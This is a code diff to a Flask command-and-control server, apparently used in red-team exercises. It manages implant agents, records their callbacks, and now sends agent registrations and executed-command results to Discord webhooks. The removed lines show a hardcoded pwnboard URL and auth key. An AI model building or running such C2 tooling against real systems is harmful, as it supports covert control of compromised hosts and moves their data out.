@@ -9,12 +9,20 @@ import time
 import threading
 import os
 import logging
+import io
 from werkzeug.utils import secure_filename
+from dotenv import load_dotenv
 
 app = Flask(__name__)
+load_dotenv()
 
 #Configuration dictionary
-config = {"upload_dir": "uploads", "show_requests": True,"debug":False,"pwnboard":True,"pwnboard_url":"https://margs.salsas.bar/pwn/boxaccess","ip_whitelisting":False,"allowed_ips":["127.0.0.1","::1"],"auth_key":"letredin"}
+config = {"upload_dir": "uploads", "show_requests": True,"debug":False,"pwnboard":os.getenv("PWNBOARD",False),"pwnboard_url":os.getenv("PWNBOARD_URL",""),"ip_whitelisting":False,"allowed_ips":["127.0.0.1","::1"],"auth_key":os.getenv("SKELETOR_AUTH_KEY",None),"notify_discord":os.getenv("NOTIFY_DISCORD",False)}
+if config.get("notify_discord"):
+    config["RESULT_WEBHOOK"] = os.getenv("SKELETOR_RESULT_WEBHOOK",None)
+    config["STATUS_WEBHOOK"] = os.getenv("SKELETOR_STATUS_WEBHOOK",None)
+for i in config:
+    print(i+":"+str(config[i]))
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -115,15 +123,54 @@ def check_agent_status():
                     if agent.last_seen.tzinfo is None:  # If it's naive, assume it's in UTC
                         agent.last_seen = agent.last_seen.replace(tzinfo=timezone.utc)
                 if (now - agent.last_seen).total_seconds() > timeout:
-                    agent.status = 'inactive'
+                    if agent.status != 'inactive':
+                        if config.get("notify_discord"):
+                            discord_notify_inactive(agent.agent_id)
+                        agent.status = 'inactive'
             db.session.commit()
         time.sleep(180)
 
 def on_callback(agent):
+    if agent.status == 'inactive' and config.get("discord_notify"):
+        discord_notify_return(agent.agent_id)
     agent.status = 'active'
     agent.callbacks += 1
     update_timestamp(agent.agent_id)
     update_pwnboard(agent.agent_id)
+
+def discord_notify_newagent(agent_id):
+    webhook_url = config["STATUS_WEBHOOK"]
+    if webhook_url:
+        requests.post(webhook_url, json={"content": f"Registration received from {agent_id}"})
+
+
+def discord_notify_inactive(agent_id):
+    webhook_url = config["STATUS_WEBHOOK"]
+    if webhook_url:
+        requests.post(webhook_url, json={"content": f"{agent_id} is inactive!"})
+
+def discord_notify_return(agent_id):
+    webhook_url = config["STATUS_WEBHOOK"]
+    if webhook_url:
+        requests.post(webhook_url, json={"content": f"{agent_id} is back!"})
+
+def discord_notify_result(agent_id,result):
+    webhook_url = config["RESULT_WEBHOOK"]
+    if webhook_url:
+        try:
+            r = requests.post(webhook_url, json={"content": f"Agent ID: {agent_id}\nResult:\n\n{result}\n"})
+            if r.status_code != 204:
+                if r.text == '{"content": ["Must be 2000 or fewer in length."]}':
+                    raise ValueError("Message too long")
+                print("ERROR:\t",r.status_code,"-",r.text)
+        except ValueError:
+            file = io.BytesIO(result.encode())
+            files = {'file': ('result.txt', file)}
+            payload = {'content': "Results too long, see file:"}
+            r = requests.post(webhook_url, data=payload, files=files)
+        except Exception as e:
+            print("ERROR:\t",str(e))
+
     
 #ROUTES:
 
@@ -136,6 +183,8 @@ def register_agent():
     implant_type = data.get("implant_type")
     print(data)
     if agent_id:
+        if config.get("notify_discord"):
+            discord_notify_newagent(agent_id)
         agent = Agent.query.filter_by(agent_id=agent_id).first()
         if not agent:
             new_agent = Agent(agent_id=agent_id)
@@ -167,11 +216,13 @@ def register_agent():
 def submit_results():
     try:
         # print(request.json)
-        print(f"\nIP: {request.json.get('agent_id')}" + "\t" + f"Result: {request.json.get('result')}"+"\n")
         data = request.json
-        agent_id = data['agent_id']
-        task_id = data['task_id']
         result = data['result']
+        agent_id = data['agent_id']
+        print(f"\nIP: {agent_id}" + "\t" + f"Result: {result}"+"\n")
+        if config.get("notify_discord"):
+            discord_notify_result(agent_id,result)
+        task_id = data['task_id']
         task = db.session.get(Task, task_id)
         task.completed = True
         task.returncode = data['returncode']
